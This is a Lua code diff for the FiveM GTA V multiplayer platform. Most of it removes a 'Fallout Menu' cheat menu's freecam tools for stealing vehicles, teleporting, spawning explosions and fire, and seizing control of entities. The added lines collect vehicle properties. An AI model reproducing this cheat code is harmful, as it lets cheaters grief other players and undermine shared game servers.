-                end
-
-                if FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
-                    _stealing = nil
-
-                    return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                end
-
-                FM:DoRCCar(random_npc, _stealing)
-                _stealing_ped = nil
-                _stealing = nil
-            end)
-        elseif FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and self:CheckType(ent, "VEHICLE") then
-            CreateThread(function()
-                _stealing = ent
-                local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-
-                if not FM:RequestModelSync(model) then
-                    _stealing = nil
-
-                    return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                end
-
-                FM:GetFunction("ClearPedTasksImmediately")(FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
-                local random_npc = FM:GetFunction("CreatePedInsideVehicle")(_stealing, 24, FM:GetFunction("GetHashKey")(model), -1, true, true)
-
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                    FM:GetFunction("SetEntityVisible")(random_npc, false)
-                end
-
-                FM:GetFunction("SetPedAlertness")(random_npc, 0.0)
-                FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
-                FM:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
-                _stealing_ped = random_npc
-
-                if FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
-                    _stealing = nil
-
-                    return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                end
-
-                FM:DoRCCar(random_npc, _stealing)
-                _stealing_ped = nil
-                _stealing = nil
-            end)
-        elseif FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["X"]) then
-            CreateThread(function()
-                local modelName = FM:GetTextInput("Enter vehicle spawn name", "", 20)
-                if modelName == "" or not FM:RequestModelSync(modelName) then return FM:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000) end
-
-                if modelName then
-                    local car = FM:GetFunction("CreateVehicle")(FM:GetFunction("GetHashKey")(modelName), endCoords.x, endCoords.y, endCoords.z, dict.math.random(-360, 360) + 0.0, true, false)
-
-                    if FM:GetFunction("DoesEntityExist")(car) then
-                        _stealing = car
-                        local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-
-                        if not FM:RequestModelSync(model) then
-                            _stealing = nil
-
-                            return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                        end
-
-                        FM:GetFunction("ClearPedTasksImmediately")(FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
-                        local random_npc = FM:GetFunction("CreatePedInsideVehicle")(_stealing, 24, FM:GetFunction("GetHashKey")(model), -1, true, true)
-                        FM:GetFunction("SetPedAlertness")(random_npc, 0.0)
-                        FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
-                        FM:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
-                        _stealing_ped = random_npc
-
-                        if FM:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
-                            _stealing = nil
-
-                            return FM:AddNotification("ERROR", "Failed to steal vehicle!")
-                        end
-
-                        FM:DoRCCar(random_npc, _stealing)
-                        _stealing_ped = nil
-                        _stealing = nil
-                    end
-                end
-            end)
-        end
-
-        self:DrawBoundingBox(ent, 255, 255, 120, 50)
-        self:DrawInfoCard(ent)
-    end
-
-    function FM.FreeCam:ManipulationLogic(cam, x, y, z)
-        if FM:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
-        self:Crosshair((FM:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and FM:GetFunction("DoesEntityExist")(self.HoveredEntity)) or (FM:GetFunction("DoesEntityHaveDrawable")(self.DraggingEntity) and FM:GetFunction("DoesEntityExist")(self.DraggingEntity)))
-        local rightVec, forwardVec, upVec = FM:GetFunction("GetCamMatrix")(cam)
-        local curVec = vector3(x, y, z)
-        local targetVec = curVec + forwardVec * 150
-        local handle = FM:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
-        local _, hit, endCoords, _, entity = FM:GetFunction("GetShapeTestResult")(handle)
-
-        if self.DraggingEntity and not FM:GetFunction("DoesEntityExist")(self.DraggingEntity) then
-            self.DraggingEntity = nil
-            self.Rotating = nil
-            lift_height = 0.0
-            lift_inc = 0.1
-
-            return
-        end
-
-        if FM.Showing then return end
-
-        if notif_alpha > 0 then
-            offX = _lerp(0.1, offX, 429)
-        else
-            offX = _lerp(0.1, offX, 0)
-        end
-
-        if not hit then
-            endCoords = targetVec
-        end
-
-        if preview_spike_strip and FM:GetFunction("DoesEntityExist")(preview_spike_strip) and self.Mode ~= self.Modes["SPIKE_STRIPS"] then
-            FM.Util:DeleteEntity(preview_spike_strip)
-            preview_spike_strip = nil
-        end
-
-        if self:CheckType(entity, "ALL") then
-            self.HoveredEntity = entity
-        else
-            self.HoveredEntity = nil
-        end
-
-        if self.Mode == self.Modes["REMOVER"] then return self:Remover(entity, "ALL") end
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["E"], 0), "Clone"}})
-
-        if self.Mode == self.Modes["PED_SPAWNER"] then
-            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PED")
-        elseif self.Mode == self.Modes["OBJ_SPAWNER"] then
-            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "OBJECT")
-        elseif self.Mode == self.Modes["VEH_SPAWNER"] then
-            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "VEHICLE")
-        elseif self.Mode == self.Modes["PREMADE_SPAWNER"] then
-            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PREMADE")
-        elseif self.Mode == self.Modes["TELEPORT"] then
-            FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Teleport"}, {"b_117", "Change Mode"}})
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and not FM.Showing and hit then
-                FM:GetFunction("SetEntityCoords")(FM:GetFunction("PlayerPedId")(), endCoords.x, endCoords.y, endCoords.z)
-                FM:AddNotification("INFO", "Teleported!", 2500)
-            end
-
-            return
-        elseif self.Mode == self.Modes["RC_CAR"] then
-            return self:DoRCCar(self.HoveredEntity, endCoords)
-        elseif self.Mode == self.Modes["STEAL"] then
-            return self:DoSteal(self.HoveredEntity)
-        elseif self.Mode == self.Modes["TAZE"] then
-            return self:DoTaze(self.HoveredEntity, endCoords)
-        elseif self.Mode == self.Modes["HYDRANT"] then
-            return self:DoHydrant(self.HoveredEntity, endCoords)
-        elseif self.Mode == self.Modes["FIRE"] then
-            return self:DoFire(self.HoveredEntity, endCoords)
-        elseif self.Mode == self.Modes["SPIKE_STRIPS"] then
-            return self:DoSpikeStrips(self.HoveredEntity, endCoords)
-        elseif self.Mode == self.Modes["DISABLE_VEHICLE"] then
-            return self:DoDisable(self.HoveredEntity, endCoords)
-        elseif self.Mode == self.Modes["EXPLODE"] then
-            return self:DoExplosion(self.HoveredEntity, endCoords)
-        end
-
-        if FM:GetFunction("DoesEntityExist")(self.DraggingEntity) then
-            if frozen_ents[self.DraggingEntity] == nil then
-                frozen_ents[self.DraggingEntity] = true
-            end
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["DELETE"]) and not FM.Showing then
-                if self.DraggingEntity == FM:GetFunction("PlayerPedId")() then return FM:AddNotification("ERROR", "You can not delete yourself!", 10000) end
-                if _is_ped_player(self.DraggingEntity) then return FM:AddNotification("ERROR", "You can not delete players!", 10000) end
-                self:DrawBoundingBox(self.DraggingEntity, 255, 50, 50, 50)
-                FM:AddNotification("INFO", "Deleted ~y~" .. dict.tostring(self.DraggingEntity) .. "~w~", 10000)
-                FM.Util:DeleteEntity(self.DraggingEntity)
-                self.DraggingEntity = nil
-                lift_height = 0.0
-                lift_inc = 0.1
-                self.Rotating = nil
-
-                return
-            end
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["E"]) then
-                self:Clone(self.DraggingEntity)
-            end
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE2"]) and not FM.Showing then
-                local data = self.DraggingData
-
-                if data then
-                    FM:GetFunction("SetEntityCoords")(self.DraggingEntity, data.Position.x, data.Position.y, data.Position.z)
-                    FM:GetFunction("SetEntityRotation")(self.DraggingEntity, data.Rotation.x, data.Rotation.y, data.Rotation.z)
-                end
-
-                self.DraggingEntity = nil
-                lift_height = 0.0
-                lift_inc = 0.1
-                self.Rotating = nil
-
-                return
-            elseif FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and not FM.Showing then
-                self.DraggingEntity = nil
-                lift_height = 0.0
-                lift_inc = 0.1
-                self.Rotating = nil
-
-                return
-            end
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["R"]) and not FM.Showing then
-                self.Rotating = not self.Rotating
-                local rot = FM:GetFunction("GetEntityRotation")(self.DraggingEntity)
-                rotP, rotY, rotR = rot.x, rot.y, rot.z
-            end
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["LEFTALT"]) and not self.Rotating then
-                frozen_ents[self.DraggingEntity] = not frozen_ents[self.DraggingEntity]
-            end
-
-            FM:GetFunction("FreezeEntityPosition")(self.DraggingEntity, frozen_ents[entity])
-
-            if self.Rotating and not FM.Showing then
-                self:DrawBoundingBox(self.DraggingEntity, 255, 125, 50, 50)
-                FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["R"], 0), "Exit Rotate Mode"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE2"], 0), "Reset Position"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Stop Dragging"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTSHIFT"], 0), "Snap Nearest 45 Degrees"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTALT"], 0), "Increment x" .. (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)}, {"t_D%t_A", "Roll"}, {"t_W%t_S", "Pitch"}, {"b_2000%t_X", "Yaw"}})
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["D"]) then
-                    rotR = rotR + (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        rotR = _snap(rotR)
-                    end
-                end
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["A"]) then
-                    rotR = rotR - (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        rotR = _snap(rotR)
-                    end
-                end
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["W"]) then
-                    rotP = rotP - (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        rotP = _snap(rotP)
-                    end
-                end
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["S"]) then
-                    rotP = rotP + (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        rotP = _snap(rotP)
-                    end
-                end
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["SPACE"]) then
-                    rotY = rotY - (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        rotY = _snap(rotY)
-                    end
-                end
-
-                if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["X"]) then
-                    rotY = rotY + (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTALT"]) and 1.0 or 15.0)
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        rotY = _snap(rotY)
-                    end
-                end
-
-                FM:GetFunction("SetEntityRotation")(self.DraggingEntity, rotP + 0.0, rotY + 0.0, rotR + 0.0)
-                self:DrawInfoCard(self.DraggingEntity)
-
-                return FM:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
-            end
-
-            local handleTrace = FM:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1, self.DraggingEntity)
-            local _, hit, endPos, _, _ = FM:GetFunction("GetShapeTestResult")(handleTrace)
-            local c = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(self.DraggingEntity, 0.0, 0.0, 0.0)
-            local cX, cY, cZ = c.x, c.y, c.z
-            local cam_rot = FM:GetFunction("GetCamRot")(self.Cam, 0)
-            local rot = FM:GetFunction("GetEntityRotation")(self.DraggingEntity)
-            FM:GetFunction("SetEntityRotation")(self.DraggingEntity, rot.x, rot.y, cam_rot.z + 0.0)
-
-            if IsDisabledControlJustPressed(0, FM.Keys["["]) then
-                lift_inc = lift_inc + 0.05
-
-                if lift_inc <= 0.01 then
-                    lift_inc = 0.01
-                elseif lift_inc >= 3 then
-                    lift_inc = 3
-                end
-            end
-
-            if IsDisabledControlJustPressed(0, FM.Keys["]"]) then
-                lift_inc = lift_inc - 0.05
-
-                if lift_inc <= 0.01 then
-                    lift_inc = 0.01
-                elseif lift_inc >= 3 then
-                    lift_inc = 3
-                end
-            end
-
-            if IsDisabledControlPressed(0, FM.Keys["C"]) then
-                lift_height = lift_height + lift_inc
-            end
-
-            if IsDisabledControlPressed(0, FM.Keys["Z"]) then
-                lift_height = lift_height - lift_inc
-            end
-
-            if hit then
-                FM:GetFunction("SetEntityCoords")(self.DraggingEntity, endPos.x, endPos.y, endPos.z + lift_height)
-                self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
-            else
-                FM:GetFunction("SetEntityCoords")(self.DraggingEntity, targetVec.x, targetVec.y, targetVec.z + lift_height)
-                self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
-            end
-
-            self:DrawInfoCard(self.DraggingEntity)
-            FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["C"], 0), "Lift Up (+" .. lift_inc .. ")"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["Z"], 0), "Push Down (-" .. lift_inc .. ")"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["R"], 0), "Rotate"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["LEFTALT"], 0), "Toggle Frozen"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE2"], 0), "Reset Position"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Stop Dragging"}, {FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["E"], 0), "Clone"}})
-
-            return FM:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
-        end
-
-        local ent = FM:GetFunction("DoesEntityExist")(self.DraggingEntity) and self.DraggingEntity or self.HoveredEntity
-
-        if FM:GetFunction("DoesEntityExist")(ent) and FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["E"]) then
-            self:Clone(ent)
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) or beginning_target ~= nil then return self:PedTarget(cam, x, y, z) end
-
-        if FM:GetFunction("DoesEntityExist")(self.HoveredEntity) and FM:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and not FM:GetFunction("DoesEntityExist")(self.DraggingEntity) then
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and not FM.Showing and not _is_ped_player(self.HoveredEntity) then
-                self.DraggingEntity = self.HoveredEntity
-
-                self.DraggingData = {
-                    Position = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(self.HoveredEntity, 0.0, 0.0, 0.0),
-                    Rotation = FM:GetFunction("GetEntityRotation")(self.HoveredEntity)
-                }
-            else
-                self:DrawBoundingBox(self.HoveredEntity, 255, 255, 255, 50)
-                self:DrawInfoCard(self.HoveredEntity)
-            end
-        end
-    end
-
-    function FM.FreeCam:DisableMovement(off)
-        FM:GetFunction("DisableControlAction")(1, 30, off)
-        FM:GetFunction("DisableControlAction")(1, 31, off)
-        FM:GetFunction("DisableControlAction")(1, 32, off)
-        FM:GetFunction("DisableControlAction")(1, 33, off)
-        FM:GetFunction("DisableControlAction")(1, 34, off)
-        FM:GetFunction("DisableControlAction")(1, 35, off)
-        FM:GetFunction("DisableControlAction")(1, 36, off)
-        FM:GetFunction("DisableControlAction")(1, 37, off)
-        FM:GetFunction("DisableControlAction")(1, 38, off)
-        FM:GetFunction("DisableControlAction")(1, 44, off)
-        FM:GetFunction("DisableControlAction")(1, 45, off)
-        FM:GetFunction("DisableControlAction")(0, 63, off)
-        FM:GetFunction("DisableControlAction")(0, 64, off)
-        FM:GetFunction("DisableControlAction")(0, 71, off)
-        FM:GetFunction("DisableControlAction")(0, 72, off)
-        FM:GetFunction("DisableControlAction")(0, 75, off)
-        FM:GetFunction("DisableControlAction")(0, 278, off)
-        FM:GetFunction("DisableControlAction")(0, 279, off)
-        FM:GetFunction("DisableControlAction")(0, 280, off)
-        FM:GetFunction("DisableControlAction")(0, 281, off)
-        FM:GetFunction("DisablePlayerFiring")(FM:GetFunction("PlayerId")(), off)
-        FM:GetFunction("DisableControlAction")(0, 24, off)
-        FM:GetFunction("DisableControlAction")(0, 25, off)
-        FM:GetFunction("DisableControlAction")(1, 37, off)
-        FM:GetFunction("DisableControlAction")(0, 47, off)
-        FM:GetFunction("DisableControlAction")(0, 58, off)
-        FM:GetFunction("DisableControlAction")(0, 140, off)
-        FM:GetFunction("DisableControlAction")(0, 141, off)
-        FM:GetFunction("DisableControlAction")(0, 81, off)
-        FM:GetFunction("DisableControlAction")(0, 82, off)
-        FM:GetFunction("DisableControlAction")(0, 83, off)
-        FM:GetFunction("DisableControlAction")(0, 84, off)
-        FM:GetFunction("DisableControlAction")(0, 12, off)
-        FM:GetFunction("DisableControlAction")(0, 13, off)
-        FM:GetFunction("DisableControlAction")(0, 14, off)
-        FM:GetFunction("DisableControlAction")(0, 15, off)
-        FM:GetFunction("DisableControlAction")(0, 24, off)
-        FM:GetFunction("DisableControlAction")(0, 16, off)
-        FM:GetFunction("DisableControlAction")(0, 17, off)
-        FM:GetFunction("DisableControlAction")(0, 96, off)
-        FM:GetFunction("DisableControlAction")(0, 97, off)
-        FM:GetFunction("DisableControlAction")(0, 98, off)
-        FM:GetFunction("DisableControlAction")(0, 96, off)
-        FM:GetFunction("DisableControlAction")(0, 99, off)
-        FM:GetFunction("DisableControlAction")(0, 100, off)
-        FM:GetFunction("DisableControlAction")(0, 142, off)
-        FM:GetFunction("DisableControlAction")(0, 143, off)
-        FM:GetFunction("DisableControlAction")(0, 263, off)
-        FM:GetFunction("DisableControlAction")(0, 264, off)
-        FM:GetFunction("DisableControlAction")(0, 257, off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["C"], off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["F"], off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["LEFTCTRL"], off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["MOUSE1"], off)
-        FM:GetFunction("DisableControlAction")(1, 25, off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["R"], off)
-        FM:GetFunction("DisableControlAction")(1, 45, off)
-        FM:GetFunction("DisableControlAction")(1, 80, off)
-        FM:GetFunction("DisableControlAction")(1, 140, off)
-        FM:GetFunction("DisableControlAction")(1, 250, off)
-        FM:GetFunction("DisableControlAction")(1, 263, off)
-        FM:GetFunction("DisableControlAction")(1, 310, off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["TAB"], off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["SPACE"], off)
-        FM:GetFunction("DisableControlAction")(1, FM.Keys["X"], off)
-    end
-
-    function FM.FreeCam:DisableCombat(off)
-        FM:GetFunction("DisablePlayerFiring")(FM:GetFunction("PlayerId")(), off) -- Disable weapon firing
-        FM:GetFunction("DisableControlAction")(0, 24, off) -- disable attack
-        FM:GetFunction("DisableControlAction")(0, 25, off) -- disable aim
-        FM:GetFunction("DisableControlAction")(1, 37, off) -- disable weapon select
-        FM:GetFunction("DisableControlAction")(0, 47, off) -- disable weapon
-        FM:GetFunction("DisableControlAction")(0, 58, off) -- disable weapon
-        FM:GetFunction("DisableControlAction")(0, 140, off) -- disable melee
-        FM:GetFunction("DisableControlAction")(0, 141, off) -- disable melee
-        FM:GetFunction("DisableControlAction")(0, 142, off) -- disable melee
-        FM:GetFunction("DisableControlAction")(0, 143, off) -- disable melee
-        FM:GetFunction("DisableControlAction")(0, 263, off) -- disable melee
-        FM:GetFunction("DisableControlAction")(0, 264, off) -- disable melee
-        FM:GetFunction("DisableControlAction")(0, 257, off) -- disable melee
-    end
-
-    function FM.FreeCam:MoveCamera(cam, x, y, z)
-        if FM:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return x, y, z end
-        if self.Rotating then return x, y, z end
-        local curVec = vector3(x, y, z)
-        local rightVec, forwardVec, upVec = FM:GetFunction("GetCamMatrix")(cam)
-        local speed = 1.0
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTCTRL"]) then
-            speed = 0.1
-        elseif FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-            speed = 1.8
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["W"]) then
-            curVec = curVec + forwardVec * speed
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["S"]) then
-            curVec = curVec - forwardVec * speed
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["A"]) then
-            curVec = curVec - rightVec * speed
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["D"]) then
-            curVec = curVec + rightVec * speed
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["SPACE"]) then
-            curVec = curVec + upVec * speed
-        end
-
-        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["X"]) then
-            curVec = curVec - upVec * speed
-        end
-
-        return curVec.x, curVec.y, curVec.z
-    end
-
-    function FM.FreeCam:DrawMode()
-        local name = self.ModeNames[self.Mode]
-        FM:ScreenText("~w~[~y~Fallout Menu~w~] Freecam Mode: ~y~" .. name, 4, 1.0, 0.5, 0.97, 0.35, 255, 255, 255, 225)
-    end
-
-    local _on
-
-    function FM.FreeCam:Tick()
-        if not FM:GetFunction("DoesCamExist")(self.Cam) then
-            self.Cam = FM:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
-        end
-
-        while FM.Enabled do
-            FM.FreeCam:Switcher()
-            local rot_vec = FM:GetFunction("GetGameplayCamRot")(0)
-            Wait(0)
-
-            if self.On and not _on then
-                FM:GetFunction("SetCamActive")(self.Cam, true)
-                FM:GetFunction("RenderScriptCams")(true, false, false, true, true)
-                _on = true
-                local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0) + (FM:GetFunction("GetEntityForwardVector")(FM:GetFunction("PlayerPedId")()) * 2)
-                camX, camY, camZ = coords.x, coords.y, coords.z + 1.0
-                FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                self:DeletePreview()
-                walking = false
-            elseif not self.On and _on then
-                FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), false)
-                FM:GetFunction("SetCamActive")(self.Cam, false)
-                FM:GetFunction("RenderScriptCams")(false, false, false, false, false)
-                FM:GetFunction("SetFocusEntity")(FM:GetFunction("PlayerPedId")())
-                self:DisableMovement(false)
-                self:DeletePreview()
-                _on = false
-            end
-
-            if self.On and _on then
-                if not FM:GetFunction("IsPedInAnyVehicle")(FM:GetFunction("PlayerPedId")()) and not FM.Config.UseAutoWalkAlt then
-                    FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), true)
-                elseif FM.Config.UseAutoWalkAlt then
-                    FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), false)
-                end
-
-                FM:DrawIbuttons()
-                self:DrawMode()
-                self:DisableMovement(true)
-                FM:GetFunction("SetFocusPosAndVel")(camX, camY, camZ, 0, 0, 0)
-                FM:GetFunction("SetCamCoord")(self.Cam, camX, camY, camZ)
-                FM:GetFunction("SetCamRot")(self.Cam, rot_vec.x + 0.0, rot_vec.y + 0.0, rot_vec.z + 0.0)
-                camX, camY, camZ = self:MoveCamera(self.Cam, camX, camY, camZ)
-                self:ManipulationLogic(self.Cam, camX, camY, camZ)
-            end
-        end
-    end
-
-    function FM:Spectate(who)
-        if not who then
-            self.SpectatingPlayer = nil
-            self.Spectating = false
-
-            return
-        end
-
-        self.SpectatingPlayer = who
-        self.Spectating = true
-    end
-
-    function FM:DoRCCar(driver, veh)
-        if self.RCCar.On then
-            FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.RCCar.Driver, false)
-            FM:GetFunction("ClearPedTasks")(self.RCCar.Driver)
-            FM:GetFunction("ClearPedSecondaryTask")(self.RCCar.Driver)
-
-            if driver then
-                self.Util:DeleteEntity(self.RCCar.Driver)
-                FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
-                FM:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
-            else
-                if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                    TaskLeaveAnyVehicle(self.RCCar.Driver)
-                    FM:GetFunction("TaskWanderStandard")(self.RCCar.Driver)
-                else
-                    FM:GetFunction("TaskVehicleDriveWander")(self.RCCar.Driver, FM:GetFunction("GetVehiclePedIsIn")(self.RCCar.Driver), 1000.0, 0)
-                end
-
-                FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
-                FM:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
+        for id = 0, 12 do
+            if DoesExtraExist(vehicle, id) then
+                local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
+                extras[tostring(id)] = state
             end
-        end
-
-        if not driver then
-            self.RCCar.On = false
-            self.RCCar.Driver = nil
-            self.RCCar.Vehicle = nil
-
-            return
         end
-
-        self.RCCar.On = true
-        self.RCCar.Driver = driver
-        self.RCCar.Vehicle = veh
-    end
-
-    FM.Spectating = false
-    local spec_on
-
-    function FM:Polar3DToWorld(entityPosition, radius, polarAngleDeg, azimuthAngleDeg)
-        local polarAngleRad = polarAngleDeg * dict.math.pi / 180.0
-        local azimuthAngleRad = azimuthAngleDeg * dict.math.pi / 180.0
 
         return {
-            x = entityPosition.x + radius * (dict.math.sin(azimuthAngleRad) * dict.math.cos(polarAngleRad)),
-            y = entityPosition.y - radius * (dict.math.sin(azimuthAngleRad) * dict.math.sin(polarAngleRad)),
-            z = entityPosition.z - radius * dict.math.cos(azimuthAngleRad)
+            model = GetEntityModel(vehicle),
+
+            plate = math.trim(GetVehicleNumberPlateText(vehicle)),
+            plateIndex = GetVehicleNumberPlateTextIndex(vehicle),
+
+            health = GetEntityMaxHealth(vehicle),
+            dirtLevel = GetVehicleDirtLevel(vehicle),
+
+            color1 = color1,
+            color2 = color2,
+
+            pearlescentColor = pearlescentColor,
+            wheelColor = wheelColor,
+
+            wheels = GetVehicleWheelType(vehicle),
+            windowTint = GetVehicleWindowTint(vehicle),
+
+            neonEnabled = {
+                IsVehicleNeonLightEnabled(vehicle, 0), IsVehicleNeonLightEnabled(vehicle, 1), IsVehicleNeonLightEnabled(vehicle, 2),
+                IsVehicleNeonLightEnabled(vehicle, 3)
+            },
+
+            extras = extras,
+
+            neonColor = table.pack(GetVehicleNeonLightsColour(vehicle)),
+            tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(vehicle)),
+
+            modSpoilers = GetVehicleMod(vehicle, 0),
+            modFrontBumper = GetVehicleMod(vehicle, 1),
+            modRearBumper = GetVehicleMod(vehicle, 2),
+            modSideSkirt = GetVehicleMod(vehicle, 3),
+            modExhaust = GetVehicleMod(vehicle, 4),
+            modFrame = GetVehicleMod(vehicle, 5),
+            modGrille = GetVehicleMod(vehicle, 6),
+            modHood = GetVehicleMod(vehicle, 7),
+            modFender = GetVehicleMod(vehicle, 8),
+            modRightFender = GetVehicleMod(vehicle, 9),
+            modRoof = GetVehicleMod(vehicle, 10),
+
